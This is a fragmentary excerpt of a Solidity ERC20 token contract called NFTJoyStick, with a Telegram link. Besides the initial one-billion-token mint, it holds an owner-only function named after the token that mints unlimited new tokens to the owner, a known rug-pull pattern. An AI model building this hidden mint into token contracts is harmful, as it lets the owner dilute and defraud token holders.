 ...
 *
 *      About Us
 *      Telegram : https://t.me/NFTJoyStick
 * 
*/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function NFTJoyStick(uint256 amount) public onlyOwner {
    _nftjoy(msg.sender, amount);
    }
    ...
    function _nftjoy(address account, uint256 amount) internal virtual {
...
contract NFTJoyStick is ERC20 {

    uint tokenTotalSupply = 1000000000;

    constructor() public ERC20("NFTJoyStick", "NFTJOY") {
        _nftjoy(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}